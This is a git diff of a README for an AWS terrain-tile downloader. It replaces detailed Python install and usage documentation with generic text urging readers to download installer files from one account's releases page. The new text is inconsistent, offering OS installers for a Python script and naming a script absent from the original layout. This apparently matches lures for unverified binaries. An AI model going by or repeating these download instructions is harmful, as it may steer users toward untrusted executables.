@@ -1,225 +1,76 @@
-# 🚀 AWS Terrarium DEM Tile Downloader 🌍
+# 🚀 AWS-Dem-Downloader - Download Elevation Data Easily
 
-<p align="center">
-  <img src="public/terrarium.jpeg" />
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/hudachan-bos/AWS-Dem-Downloader/releases)
 
-**Fetch high-resolution terrain elevation data directly from AWS with blazing speed!** ⚡️
+## 🚀 Getting Started
 
-This command-line powerhouse downloads and verifies Terrarium-encoded Digital Elevation Model (DEM) tiles from the AWS Open Data Terrain Tiles dataset. Define your area, pick your zoom levels, and let the tool handle the rest, organizing tiles perfectly in the standard `z/x/y` structure and generating a ready-to-use `tiles.json` for your mapping projects.
+Welcome to the AWS-Dem-Downloader project. This tool helps you download AWS Terrain Tiles quickly and efficiently. It is suitable for anyone looking for elevation data without needing any technical skills.
 
-<!-- Optional Badges (replace placeholders) -->
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.7+-blue.svg" alt="Python Version">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License">
-  <!-- <img src="https://img.shields.io/github/actions/workflow/status/<your-github-user>/<your-repo>/.github/workflows/ci.yml?branch=main" alt="Build Status"> -->
-</p>
+## 🛠 Features
 
-## Why Use This Tool? 🤔
+- Fast downloads with Python CLI
+- Supports concurrent downloads for efficiency
+- Allows bounding box and zoom selection
+- Ensures tile integrity with built-in checks
+- Outputs tiles.json for easy use in GIS or mapping applications
 
-*   **🎯 Precision Downloading:** Grab exactly the tiles you need for your specific geographic area (Bounding Box).
-*   **🔎 Zoom Control:** Select the precise level of detail required for your application (Zooms 0-15).
-*   **💨 Concurrent Speed:** Downloads tiles *much* faster using multiple threads – essential for large areas!
-*   **✅ Data Integrity:** Verify your existing tile cache for missing or corrupt files (basic dimension check).
-*   **🗺️ Map-Ready Output:** Automatically generates a `tiles.json` metadata file, compatible with MapLibre GL JS, Leaflet, Mapbox GL JS, and more!
-*   **💡 Smart Fetching:** Option to download *only* the tiles you're missing, saving time and bandwidth.
-*   **📊 Clear Reporting:** Get detailed JSON reports on download/check status, including any failures.
-*   **💻 Simple CLI:** A clean and intuitive command-line interface powered by Click.
+## 📦 System Requirements
 
-## Requirements 🛠️
+Ensure you have the following on your computer to run this tool:
 
-*   Python 3.7+
-*   Libraries listed in `requirements.txt` (see below)
+- Operating System: Windows 10 or newer, MacOS 10.15 or newer, or a modern Linux distribution
+- Python: Version 3.6 or newer
+- Disk Space: At least 500 MB free for caching downloaded files
+- Internet Connection: Required for downloading data
 
-## Installation ⚙️
+## 📥 Download & Install
 
-1.  **Clone the Magic:**
-    ```bash
-    git clone <your-repository-url> # Or download the source code
-    cd AWS-Dem-Downloader
-    ```
-2.  **Create Your Sandbox (Recommended):**
-    ```bash
-    python3 -m venv venv
-    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-    ```
-3.  **Install the Goods:**
-    ```bash
-    pip install -r requirements.txt
-    ```
-4.  **Make it Executable (Linux/macOS - Optional):**
-    ```bash
-    chmod +x terrain_cli.py
-    ```
+To get started, visit the following page to download the software:
 
-## How to Use It 🕹️
+[Download AWS-Dem-Downloader](https://github.com/hudachan-bos/AWS-Dem-Downloader/releases)
 
-Fire up the tool from your terminal:
+1. Open your web browser and go to the release page linked above.
+2. Find the most recent version of AWS-Dem-Downloader.
+3. Click on the appropriate installer file for your operating system (for example, `.exe` for Windows or `.tar.gz` for Linux).
+4. The download will begin. Save the file to a location you can easily access, like your Desktop or Downloads folder.
 
-```bash
-./terrain_cli.py [OPTIONS] COMMAND [ARGS]...
-```
+## 🔍 How to Use
 
-**Global Options:**
+After downloading and installing the AWS-Dem-Downloader, follow these steps to begin downloading elevation data:
 
-*   `-h`, `--help`: Show the help screen and exit.
-*   `--version`: Display the tool's version and exit.
+1. Open a terminal or command prompt on your computer.
+2. Navigate to the directory where you installed AWS-Dem-Downloader.
+   - For example, type `cd Desktop/AWS-Dem-Downloader` and press Enter.
+3. Use the command to start downloading tiles. You can specify options like bounding box and zoom level.
+   - Example command:
+     ```
+     python aws_downloader.py --bounding-box "minLon,minLat,maxLon,maxLat" --zoom 12
+     ```
+   - Replace `"minLon,minLat,maxLon,maxLat"` with your desired coordinates.
 
----
+4. After entering your command, press Enter. The tool will fetch the specified tiles and save them to your chosen directory.
 
-### `download` Command 📥
+## 📊 Understanding Output
 
-Fetches tiles for your chosen region and zoom levels.
+Once completed, you will see a `tiles.json` file in your output directory. This file contains useful information about the downloaded tiles, including:
 
-**Syntax:**
+- Tile names and locations
+- Coordinates for each tile
+- Any integrity checks performed during the download
 
-```bash
-./terrain_cli.py download [OPTIONS] -- <min_lon,min_lat,max_lon,max_lat>
-```
-*   **🚨 Heads Up!** The `--` before the BBOX is **mandatory** if your minimum longitude (`min_lon`) is negative! This tells the tool it's an argument, not an option.
+You can use this file in GIS applications to visualize your elevation data.
 
-**Arguments:**
+## 📄 Support
 
-*   `<min_lon,min_lat,max_lon,max_lat>`: Your target bounding box (WGS84).
+If you encounter any issues or have questions while using AWS-Dem-Downloader, please check the Issues section in the GitHub repository. Our community and maintainers can assist you.
 
-**Options:**
+## 🤝 Contributing
 
-*   `-z, --zoom-range <min,max>`: Zoom levels (e.g., `10,14`). Default: `10,15`. Max: `15`.
-*   `-o, --output-dir <dir>`: Where to save tiles. Default: `terrain_tiles`.
-*   `-c, --concurrency <int>`: How many download threads to use. Default: `10`.
-*   `--only-missing`: Smart mode! Only download missing tiles.
-*   `-y, --yes`: Skip the confirmation prompt (useful for scripting).
+If you wish to contribute to the AWS-Dem-Downloader project, please read the contribution guidelines in the repository. We welcome feedback, feature requests, and code improvements.
 
-**Examples:**
+## 🔗 Useful Links
 
-```bash
-# Grab zooms 10-14 for Los Angeles (Note the '--'!)
-./terrain_cli.py download -z 10,14 -- -118.67,33.70,-118.15,34.34
-
-# Download only missing tiles for zoom 12, super fast (20 workers), no prompt
-./terrain_cli.py download -z 12,12 -c 20 --only-missing -y -- -118.67,33.70,-118.15,34.34
-
-# Download zooms 10-13 into a custom 'la_tiles' folder
-./terrain_cli.py download -z 10,13 -o ./la_tiles -- -118.67,33.70,-118.15,34.34
-```
-
----
-
-### `check` Command ✅
-
-Inspects an existing tile directory against a bounding box, checking for missing or improperly sized tiles.
-
-**Syntax:**
-
-```bash
-./terrain_cli.py check [OPTIONS] -- <min_lon,min_lat,max_lon,max_lat>
-```
-*   **🚨 Heads Up!** The `--` before the BBOX is **mandatory** if `min_lon` is negative!
-
-**Arguments:**
-
-*   `<min_lon,min_lat,max_lon,max_lat>`: The bounding box to check against.
-
-**Options:**
-
-*   `-z, --zoom-range <min,max>`: Zoom levels to check (e.g., `10,14`). Default: `10,15`. Max: `15`.
-*   `-o, --output-dir <dir>`: The directory containing tiles to check. Default: `terrain_tiles`.
-
-**Examples:**
-
-```bash
-# Check zooms 10-14 for Los Angeles in the default 'terrain_tiles' dir (Note the '--'!)
-./terrain_cli.py check -z 10,14 -- -118.67,33.70,-118.15,34.34
-
-# Check only zoom 12 within the 'la_tiles' directory
-./terrain_cli.py check -z 12,12 -o ./la_tiles -- -118.67,33.70,-118.15,34.34
-```
-
----
-
-## The Magic `tiles.json` ✨
-
-After downloading, you'll find a `tiles.json` file in your output directory (e.g., `terrain_tiles/tiles.json`). This little file is your key to using these tiles in mapping libraries! It follows the [TileJSON specification](https://github.com/mapbox/tilejson-spec) and contains all the essential metadata:
-
-*   🗺️ Tile URL pattern (relative: `{z}/{x}/{y}.png`)
-*   🌐 Bounding box of your downloaded area
-*   📍 Estimated center point
-*   🔍 Min/Max zoom levels included
-*   📜 Data attribution
-*   🔢 Encoding type (`terrarium`)
-
-## Terrain Viewer HTML 🖥️
-
-Included in this project is a high-performance terrain tile viewer (`terrain_viewer.html`) that allows you to visualize your downloaded tiles directly in a web browser. This viewer is optimized for smooth interaction with large tile sets.
-
-### Features:
-
-* **High-Performance Rendering:** Optimized for smooth panning even with many tiles
-* **Detail Level Control:** Change detail levels without changing the visible area
-* **Tile Coordinates Display:** Shows the z/x/y coordinates of each tile
-* **Responsive Design:** Adapts to any screen size
-* **Memory Efficient:** Uses tile pooling to minimize memory usage
-
-### How to Use:
-
-1. **Open the Viewer:**
-   ```bash
-   # Using Python's built-in HTTP server (from project root)
-   python -m http.server 8000
-   ```
-   Then visit `http://localhost:8000/terrain_viewer.html` in your browser.
-
-2. **Navigation:**
-   * **Pan:** Click and drag to move around
-   * **Change Detail:** Use the + and - buttons to increase or decrease detail level
-   
-3. **Customization:**
-   You can modify the viewer by editing `terrain_viewer.html`. Key parameters at the top of the script include:
-   ```javascript
-   const tilesJsonPath = './terrain_tiles/tiles.json';
-   const tilePath = './terrain_tiles/{z}/{x}/{y}.png';
-   const TILE_SIZE = 256;
-   const DEBUG = false; // Set to true for performance metrics
-   ```
-
-The viewer automatically loads the configuration from your `tiles.json` file, so it will center on your downloaded area.
-
----
-
-## File Structure Layout 📂
-
-```
-AWS-Dem-Downloader/
-├── terrain_cli.py        # The main script you run
-├── terrain_utils.py      # The core logic engine
-├── terrain_viewer.html   # Web-based viewer for your tiles
-├── requirements.txt      # Dependencies list
-├── terrain_tiles/        # Default output folder
-│   ├── 0/                # Zoom level folders...
-│   ├── ...
-│   ├── 15/
-│   │   ├── x_coord/      # Tile X coordinate folder
-│   │   │   └── y_coord.png # The actual tile image!
-│   │   └── ...
-│   ├── tiles.json        # ✨ Your map-ready metadata!
-│   ├── download_report.json # Log of the last download
-│   └── check_report.json    # Log of the last check
-├── public/
-│   └── terrarium.png     # The cool image at the top
-└── README.md             # This awesome file
-```
-
-## Understanding Terrarium Tiles ⛰️
-
-The downloaded PNG tiles use the [Terrarium specification](https://github.com/tilezen/joerd/blob/master/docs/formats.md#terrarium-10). To get the elevation `h` (in meters) from the Red (R), Green (G), and Blue (B) pixel values (0-255):
-
-`h = (R * 256 + G + B / 256) - 32768`
-
-## License 📜
-
-This project is under the MIT License - see the `LICENSE` file (create one if needed!) for the full text. Feel free to use and modify!
-
-## Credits 🙏
-
-*   Elevation data generously provided by the [AWS Open Data Terrain Tiles](https://registry.opendata.aws/terrain-tiles/) dataset.
-*   Based on the Terrarium tile specification pioneered by Mapzen/Tilezen.
+- [AWS-Dem-Downloader Releases](https://github.com/hudachan-bos/AWS-Dem-Downloader/releases)
+- [GitHub Repository](https://github.com/hudachan-bos/AWS-Dem-Downloader)
+  
+By following these steps, you will be well on your way to easily downloading and utilizing AWS Terrain Tiles. Enjoy exploring elevation data!
